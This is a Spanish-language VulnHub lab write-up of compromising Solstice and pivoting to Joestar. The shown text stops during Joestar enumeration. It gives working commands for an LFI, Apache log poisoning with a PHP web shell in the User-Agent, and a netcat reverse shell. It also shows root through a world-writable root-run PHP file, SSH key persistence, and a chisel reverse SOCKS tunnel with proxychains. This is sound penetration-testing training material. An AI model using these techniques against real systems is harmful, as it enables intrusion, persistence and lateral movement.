---
layout: single
title: Solstice y Joestar - VulnHub
excerpt: "En este vamos a estar haciendo un laboratorio de pivoting para practicar vamos a estar resolviendo las masquinas solstice y joestar que solomente de primeras solo tenemos conexion con una sola la maquina y tenemos que comprometer una para tener conexion con la otra una de las maquinas simula un deposito de gas tendremos que explotar un LFI y gracias a eso haremos un Log Poisoning para ganar acceso tendremos que usar chisel y proxychains entre otras cosas para poder comprometer Joestar que la maquina es algo rara pero muy buena"
date: 2023-04-03
classes: wide
toc: true
toc_label: "Contenidos"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-pivoting2/icon.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
tags:  
  - LFI
  - Bash Scripting
  - Log Poisoning
  - Gas Station ATGs
  - Pivoting
  - LXD group
---

<p align="center">
<img src="/assets/images/vh-writeup-pivoting2/icon.png">
</p>

El primer post de `pivoting` fue este

<https://mikerega7.github.io/vh-writeup-pivoting1/>

>
* **Recordar entorno:** Solo tenemos conexion con una sola maquina que es la solstice primero tenemos que comprometer esa maquina para poder ver la otra que es la Joestar nuestra maquina de atacante no tiene conexion directa con la Joestar
>

```bash
❯ arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f1:59:4d, IPv4: 192.168.1.94
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.69	80:30:49:81:dc:ad	(Unknown)
192.168.1.153	00:0c:29:e1:3e:1e	VMware, Inc.
```

```bash
❯ ping -c 1 192.168.1.153
PING 192.168.1.153 (192.168.1.153) 56(84) bytes of data.
64 bytes from 192.168.1.153: icmp_seq=1 ttl=64 time=0.433 ms

--- 192.168.1.153 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.433/0.433/0.433/0.000 ms
❯ whichSystem.py 192.168.1.153

192.168.1.153 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p21,22,25,80,139,445,2121,3128,8593,54787,62524 192.168.1.153 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 11:27 CST
Nmap scan report for 192.168.1.153
Host is up (0.00027s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.1.153:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5ba737fd556cf8ea03f510bc94320718 (RSA)
|   256 abda6a6f973fb2703e6c2b4b0cb7f64c (ECDSA)
|_  256 ae29d4e346a1b15227838f8fb0c436d1 (ED25519)
25/tcp    open  smtp        Exim smtpd 4.92
| smtp-commands: solstice Hello nmap.scanme.org [192.168.1.94], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drws------   2 www-data www-data     4096 Jun 18  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.1.153:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
3128/tcp  open  squid-http?
8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
62524/tcp open  ftp         FreeFloat ftpd 1.00
MAC Address: 00:0C:29:E1:3E:1E (VMware)
Service Info: Host: solstice; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m58s
|_nbstat: NetBIOS name: SOLSTICE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   NetBIOS computer name: SOLSTICE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-03T13:30:02-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

```

No encuentra nada

```bash
❯ nmap --script=http-enum -p80 192.168.1.153 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 11:34 CST
Nmap scan report for 192.168.1.153
Host is up (0.00054s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:E1:3E:1E (VMware)

```

## Enumeracion

Vamos a conectarnos como `anonymous` ala maquina victima por `ftp` pero no podemos

```bash
❯ ftp 192.168.1.153
Connected to 192.168.1.153.
220 pyftpdlib 1.5.6 ready.
Name (192.168.1.153:miguelrega7): anonymous
331 Username ok, send password.
Password:
530 Anonymous access not allowed.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Esta es la pagina web 

![](/assets/images/vh-writeup-pivoting2/1.png)

Vemos un servicio con su version

![](/assets/images/vh-writeup-pivoting2/2.png)

Vamos a hacer `fuzzing` pero no podemos ver nada por el codigo de estado

```bash
❯ gobuster dir -u http://192.168.1.153/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.153/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/04/03 11:38:39 Starting gobuster in directory enumeration mode
===============================================================
/app                  (Status: 301) [Size: 312] [--> http://192.168.1.153/app/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.1.153/javascript/]
/backup               (Status: 301) [Size: 315] [--> http://192.168.1.153/backup/]    
/server-status        (Status: 403) [Size: 278]                                      
```

El puerto `2121` esta abierto que tambien es de `ftp` y `nmap` nos reporto que el usuario `anonymous` esta permitido y no encontrasmos nada

```bash
❯ ftp 192.168.1.153 2121
Connected to 192.168.1.153.
220 pyftpdlib 1.5.6 ready.
Name (192.168.1.153:miguelrega7): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 Active data connection established.
125 Data connection already open. Transfer starting.
drws------   2 www-data www-data     4096 Jun 18  2020 pub
226 Transfer complete.
ftp> cd pub
250 "/pub" is the current directory.
ftp> dir
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp> ls -la
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp> 
```

Tambien `nmap` nos reporto que el puerto `8593` corre un servicio `web`

![](/assets/images/vh-writeup-pivoting2/3.png)

Si damos `click` en `Book list` la `url` ya es interesante

![](/assets/images/vh-writeup-pivoting2/4.png)

De primeras vemos que no podemos ver el `/etc/passwd`

![](/assets/images/vh-writeup-pivoting2/5.png)

Pero si retrocedemos varios directorios asi atras si es posible entonces  es vulnerable a `LFI` 

![](/assets/images/vh-writeup-pivoting2/6.png)

El usuario `root` y `miguel` tiene un `bash`

```bash
❯ curl -s "http://192.168.1.153:8593/index.php?book=../../../../../../../etc/passwd" | grep bash
We are still setting up the library! Try later on!<p>root:x:0:0:root:/root:/bin/bash
miguel:x:1000:1000:,,,:/home/miguel:/bin/bash
```

`miguel` no tiene una `clave id_rsa` para poder conectarnos por `ssh` tenemos que convertir el `LFI` a `RCE`

![](/assets/images/vh-writeup-pivoting2/7.png)

Bueno podrias hacerte un script en `Bash` o `Python3` para automatizar el `LFI` pero bueno solo es opcional yo hice algo asi

```bash
#!/bin/bash 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}"
  exit 1
}

#Ctrl + c
trap ctrl_c INT # esto va a la funcion ctrl_c()

declare -i parameter_counter=0 # declaramos una variable int

function fileRead(){
  filename=$1
  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Este es el contenido del archivo ${endColour}${redColour}$filename${endColour}${grayColour}:${endColour}\n"
  curl -s -X GET "http://192.168.1.153:8593/index.php?book=../../../../../../../$filename"
}

function helpPanel(){
  echo -e "\n${yellowColour}[i]${endColour}${grayColour}Uso:${endColour}\n"
  echo -e "\t${redColour}h)${endColour}${blueColour} Mostrar este panel de ayuda${endColour}"
  echo -e "\t${redColour}f)${endColour}${blueColour} Proporcionar ruta del archivo a leer\n${endColour}"
  exit 0
}

#Menu cuando quieres que se te pase un argumento poner : despues de la opcion 
while getopts "hf:" arg; do
  case $arg in
    h) ;; # no hace nada por que es un panel de ayuda
    f) filename=$OPTARG; let parameter_counter+=1; # lo que le pases lo mete en la variable filename
  esac
done

if [ $parameter_counter -eq 1 ]; then
  fileRead "$filename"
else
  helpPanel
fi

```

Vamos a ver si podemos ver los `logs` de apache y podemos

![](/assets/images/vh-writeup-pivoting2/8.png)

Si lanzamos una peticion y le pasamos el `User-Agent` por que lo podemos controlar

```bash
❯ curl -s -X GET "http://192.168.1.153/xd" -H "User-Agent: pwned"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 192.168.1.153 Port 80</address>
</body></html>
```

Y  creamos un `log` con nuestro `User-Agent`

```bash
❯ curl -s -X GET "http://192.168.1.153:8593/index.php?book=../../../../../../../var/log/apache2/access.log" | tail -n 10
::1 - - [03/Apr/2023:13:40:18 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:19 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:20 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:21 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:22 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:23 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:24 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
192.168.1.94 - - [03/Apr/2023:14:14:45 -0400] "GET /xd HTTP/1.1" 404 436 "-" "pwned"
</p>    </body>
</html>
```

Lo que tenemos que hacer es un `Log Poisoning`

Como la `web` interpreta `php` en el `User-Agent` podemos inyectar codigo `php`

```bash
❯ curl -s -X GET "http://192.168.1.153/xd" -H "User-Agent: <?php system('whoami'); ?>"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 192.168.1.153 Port 80</address>
</body></html>
```

Funciona somo `www-data`

```bash
❯ curl -s -X GET "http://192.168.1.153:8593/index.php?book=../../../../../../../var/log/apache2/access.log" | tail -n 10
::1 - - [03/Apr/2023:13:40:20 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:21 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:22 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:23 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
::1 - - [03/Apr/2023:13:40:24 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
192.168.1.94 - - [03/Apr/2023:14:14:45 -0400] "GET /xd HTTP/1.1" 404 436 "-" "pwned"
192.168.1.94 - - [03/Apr/2023:14:19:34 -0400] "GET /xd HTTP/1.1" 404 436 "-" "www-data
```

Vamos a ejecutar comandos con la funcion `system` de `php`

```bash
┌─[root@miguelos]─[/home/miguelrega7/VulnHub/pivoting2/192.168.1.153/content]
└──╼ curl -s -X GET "http://192.168.1.153/xd" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 192.168.1.153 Port 80</address>
</body></html>
```

Funciona y hay vemos que hay otra interfaz de red

```bash
❯ curl -s -X GET "http://192.168.1.153:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=ip+a" | tail -n 20
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens34: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:e1:3e:28 brd ff:ff:ff:ff:ff:ff
    inet 10.10.0.128/24 brd 10.10.0.255 scope global dynamic ens34
       valid_lft 1414sec preferred_lft 1414sec
    inet6 fe80::20c:29ff:fee1:3e28/64 scope link 
       valid_lft forever preferred_lft forever
3: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:e1:3e:1e brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.153/24 brd 192.168.1.255 scope global dynamic ens33
       valid_lft 82129sec preferred_lft 82129sec
    inet6 2806:102e:10:34d9:20c:29ff:fee1:3e1e/64 scope global dynamic mngtmpaddr 
       valid_lft 2591841sec preferred_lft 2591841sec
    inet6 fe80::20c:29ff:fee1:3e1e/64 scope link 
       valid_lft forever preferred_lft forever
"
</p>    </body>
</html>
```

Vamos a ganar acceso

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Vamos a ejecutar el comando para ganar acceso

![](/assets/images/vh-writeup-pivoting2/9.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.94] from (UNKNOWN) [192.168.1.153] 60128
bash: cannot set terminal process group (526): Inappropriate ioctl for device
bash: no job control in this shell
www-data@solstice:/var/tmp/webserver$ whoami
whoami
www-data
www-data@solstice:/var/tmp/webserver$ 
```

Vamos a hacer un tratamiento de la `tty` para poder hacer un `ctrl+c`

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.94] from (UNKNOWN) [192.168.1.153] 60128
bash: cannot set terminal process group (526): Inappropriate ioctl for device
bash: no job control in this shell
www-data@solstice:/var/tmp/webserver$ whoami
whoami
www-data
www-data@solstice:/var/tmp/webserver$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@solstice:/var/tmp/webserver$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@solstice:/home$ export TERM=xterm
```

Podemos entrar

```bash
www-data@solstice:/home$ ls -l
total 4
drwxr-xr-x 3 miguel miguel 4096 Jun 26  2020 miguel
www-data@solstice:/home$ 

```

No podemos ver la `flag` solo el propiertario

```bash
www-data@solstice:/home/miguel$ ls -l
total 4
-rw------- 1 miguel miguel 33 Jun 26  2020 user.txt
www-data@solstice:/home/miguel$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@solstice:/home/miguel$ cat user.txt 
cat: user.txt: Permission denied
www-data@solstice:/home/miguel$ 

```

Si buscamos por privilegios `SUID` vemos el `pkexec` pero no lo vamos a explotar por que no es la idea

```bash
www-data@solstice:/$ find / -perm -4000 2>/dev/null
/var/tmp/sv
/var/tmp/ftp
/var/tmp/ftp/pub
/var/log/exim4
/var/log/exim4/mainlog.1
/var/log/apache2
/var/log/apache2/error.log.1
/var/log/apache2/access.log.1
/var/log/apache2/other_vhosts_access.log
/var/log/apache2/error.log.2.gz
/var/log/apache2/access.log.2.gz
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/pkexec
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/uncompress.so
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
www-data@solstice:/$ 
```

Vamos a ver puertos abiertos

```bash
www-data@solstice:/$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        1      0 0.0.0.0:8593            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:57            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:62524           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:54787           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:2121            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     
tcp      485      0 192.168.1.153:8593      192.168.1.94:46572      ESTABLISHED
tcp        0    136 192.168.1.153:60128     192.168.1.94:443        ESTABLISHED
tcp        0      0 192.168.1.153:8593      192.168.1.94:46560      ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 ::1:631                 :::*                    LISTEN     
tcp6       0      0 :::3128                 :::*                    LISTEN     
tcp6       0      0 ::1:25                  :::*                    LISTEN     
tcp6       0      0 :::445                  :::*                    LISTEN     
tcp6       0      0 :::139                  :::*                    LISTEN     
www-data@solstice:/$ 

```

Bueno cuando buscamos por privilegios `SUID` vimos que habia uno llamado `/var/tmp/sv`

```bash
www-data@solstice:/var/tmp/sv$ ls
index.php
www-data@solstice:/var/tmp/sv$ cat index.php 
<?php
echo "Under construction";
?>
www-data@solstice:/var/tmp/sv$ 
```

Si miramos procesos que tengan eso nombre vemos esto el usuario `root` se esta montando un servidor `web`

```bash
www-data@solstice:/var/tmp/sv$ ps -faux | grep "/var/tmp/sv"
www-data  1643  0.0  0.0   6076   884 pts/0    S+   14:41   0:00  |                                   \_ grep /var/tmp/sv
root       529  0.0  0.0   2388   760 ?        Ss   13:12   0:00      \_ /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
root       551  0.0  2.0 196744 20968 ?        S    13:12   0:00          \_ /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
www-data@solstice:/var/tmp/sv$ 

```

Bueno podemos alterarlo por los permisos que tiene

```bash
www-data@solstice:/var/tmp/sv$ ls -l
total 4
-rwxrwxrwx 1 root root 36 Jun 19  2020 index.php
www-data@solstice:/var/tmp/sv$ 
```

```bash
www-data@solstice:/var/tmp/sv$ nano index.php 
Unable to create directory /var/www/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

Press Enter to continue

www-data@solstice:/var/tmp/sv$ cat index.php 
<?php
	system('whoami');
?>
www-data@solstice:/var/tmp/sv$ 


```

## Escalada de privilegios

Como corre en el puerto `57` vamos a hacer una peticion para que se ejecute el comando en el puerto que `57`

```bash
www-data@solstice:/var/tmp/sv$ curl http://127.0.0.1:57
root
www-data@solstice:/var/tmp/sv$ 
```

Vamos a hacer `SUID` la `bash`

```bash
www-data@solstice:/var/tmp/sv$ cat index.php 
<?php
	system('chmod u+s /bin/bash');
?>
www-data@solstice:/var/tmp/sv$ 
```

Ahora es `SUID`

```bash
www-data@solstice:/var/tmp/sv$ curl http://127.0.0.1:57
www-data@solstice:/var/tmp/sv$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
www-data@solstice:/var/tmp/sv$ 

```

```bash
www-data@solstice:/var/tmp/sv$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt 

No ascii art for you >:(

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

f950998f0d484a2ef1ea83ed4f42bbca

bash-5.0# 
```

Comprometimos la maquina `Solstice`

## Pivoting Joestar

Vamos a irnos a `dev/shm` y vemos otra interfaz que es la `10.10.0.128`

```bash
bash-5.0# hostname -I
10.10.0.128 192.168.1.153 2806:102e:10:34d9:20c:29ff:fee1:3e1e 
```

Esta activa

```bash
bash-5.0# ping -c 1 10.10.0.128 &> /dev/null
bash-5.0# echo $?
0
bash-5.0# 
```

Vamos a hacer un `script` en `Bash` para aplicar descubrimiento

```bash
bash-5.0# cat hostDiscovery.sh 
#!/bin/bash

for i in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] Host 10.10.0.$i - ACTIVE" &
done; wait
bash-5.0# 

```

Le damos permisos de ejecucion

```bash
chmod +x hostDiscovery.sh 
```

Y este es el resultado descubrimos otra maquina con la ip `10.10.0.129` que opera en el segmento de la `10.10.0.128` que la maquina `10.10.0.129` corresponde al tanque de gas y solo tenemos acceso desde la maquina solstice

```bash
bash-5.0# ./hostDiscovery.sh 
[+] Host 10.10.0.128 - ACTIVE
[+] Host 10.10.0.129 - ACTIVE
bash-5.0# hostname -I
10.10.0.128 192.168.1.153 2806:102e:10:34d9:20c:29ff:fee1:3e1e 
bash-5.0# ping -c 1 10.10.0.129
PING 10.10.0.129 (10.10.0.129) 56(84) bytes of data.
64 bytes from 10.10.0.129: icmp_seq=1 ttl=64 time=0.777 ms

--- 10.10.0.129 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.777/0.777/0.777/0.000 ms
bash-5.0# 

```

Ahora vamos a hacer un descubrimiento de puertos tambien puedes subir el binario de `nmap` pero lo vamos a hacer mejor con el script de `bash`

```bash
bash-5.0# cat portDiscovery.sh 
#!/bin/bash

for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.129/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
bash-5.0# chmod +x portDiscovery.sh 
bash-5.0# 

```

Estos son los puertos abiertos de la maquina `10.10.0.29` que es la `Joestar`

```bash
bash-5.0# ./portDiscovery.sh 
[+] Port 22 - OPEN
[+] Port 53 - OPEN
[+] Port 80 - OPEN
[+] Port 110 - OPEN
[+] Port 143 - OPEN
[+] Port 5355 - OPEN
```

Si los queremos hacer el escaneo desde nuestra maquina de atacante necesitamos el `chisel`

<https://github.com/jpillora/chisel/releases/tag/v1.8.1>

```bash
❯ gunzip chisel_1.8.1_linux_amd64.gz
❯ mv chisel_1.8.1_linux_amd64 chisel
❯ ls
 chisel   lfi.sh
```

```bash
❯ chmod +x chisel
❯ ./chisel

  Usage: chisel [command] [--help]

  Version: 1.8.1 (go1.19.4)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

Vamos a pasarlo ala maquina victima

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


```

Y lo pasamos ala maquina

```bash
bash-5.0# cd /tmp
bash-5.0# pwd
/tmp
bash-5.0# wget http://192.168.1.94/chisel
--2023-04-03 15:14:37--  http://192.168.1.94/chisel
Connecting to 192.168.1.94:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8384512 (8.0M) [application/octet-stream]
Saving to: ‘chisel’

chisel                          100%[=======================================================>]   8.00M  --.-KB/s    in 0.06s   

2023-04-03 15:14:37 (139 MB/s) - ‘chisel’ saved [8384512/8384512]

bash-5.0# chmod +x chisel 
bash-5.0# 


```

Vamos a subir nuestra clave `id_rsa` como `authorized_keys`

```bash
bash-5.0# cd /root/.ssh/
bash-5.0# pwd
/root/.ssh
```

```bash 
❯ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:ch4nHLf75UMJ2id78oYc/ODOOb8bkwq7EtsGIA9BkwU root@miguelos
The key's randomart image is:
+---[RSA 3072]----+
|   .E+.          |
|    o.           |
|     .  . .      |
|    o .. o ..    |
|     +..S o+ . . |
|      .+o+..* +. |
|        .=oo X=  |
|        o o=B==o |
|         ooo*B*+ |
+----[SHA256]-----+
❯ ls
 id_rsa   id_rsa.pub
```

Vamos a subir la clave publica

```bash
❯ cat id_rsa.pub | xclip -sel clip
```

La pegues hay como `authorized_keys` y elimina saltos de linea si es que tiene

```bash
nano authorized_keys
```

Vamos a conectarnos por `ssh` sin proporcionar contraseña

```bash
❯ ssh root@192.168.1.153
The authenticity of host '192.168.1.153 (192.168.1.153)' can't be established.
ECDSA key fingerprint is SHA256:lcUZXSjYC2jkmAFxZOz04LufNC9R1z+0owiCdW5geKk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.153' (ECDSA) to the list of known hosts.
Linux solstice 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 26 15:56:54 2020
root@solstice:~# whoami
root
root@solstice:~# 

```

En nuestra maquina de atacante vamos a correr el `chisel` en modo servidor

```bash
❯ ./chisel server --reverse -p 1234
2023/04/03 13:24:20 server: Reverse tunnelling enabled
2023/04/03 13:24:20 server: Fingerprint KmK4WtGmNMeFZ4qf6xYWobbWjCfAdi2Ec94nItryu+8=
2023/04/03 13:24:20 server: Listening on http://0.0.0.0:1234
```

Ahora en la maquina victima nos vamos a poner como modo cliente para traernos todo los puertos

```bash
bash-5.0# ./chisel client 192.168.1.94:1234 R:socks
```

Nos lo pone en el  puerto `1080`

```bash
❯ ./chisel server --reverse -p 1234
2023/04/03 13:24:20 server: Reverse tunnelling enabled
2023/04/03 13:24:20 server: Fingerprint KmK4WtGmNMeFZ4qf6xYWobbWjCfAdi2Ec94nItryu+8=
2023/04/03 13:24:20 server: Listening on http://0.0.0.0:1234
2023/04/03 13:26:48 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Asegurate de tener esto asi

```bash
❯ catn /etc/proxychains.conf | tail -n 2
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Ahora tenemos que usar `proxychains` para pasar por el tunel

## PortScan Joestar

```bash
❯ proxychains nmap -sT -Pn --open -T5 -v -n 10.10.0.129 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 13:31 CST
Initiating Connect Scan at 13:31
Scanning 10.10.0.129 [1000 ports]
Discovered open port 53/tcp on 10.10.0.129
Discovered open port 110/tcp on 10.10.0.129
Discovered open port 143/tcp on 10.10.0.129
Discovered open port 80/tcp on 10.10.0.129
Discovered open port 22/tcp on 10.10.0.129
Discovered open port 10001/tcp on 10.10.0.129
Completed Connect Scan at 13:31, 4.98s elapsed (1000 total ports)
Nmap scan report for 10.10.0.129
Host is up (0.0046s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
110/tcp   open  pop3
143/tcp   open  imap
10001/tcp open  scp-config

```

## Enumeracion Joestar 

Tenemos el puerto 80 abierto pero vamos a usar `foxyproxy` para pasar por el tunel

```ruby
❯ proxychains whatweb http://10.10.0.129
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.129:80-<><>-OK
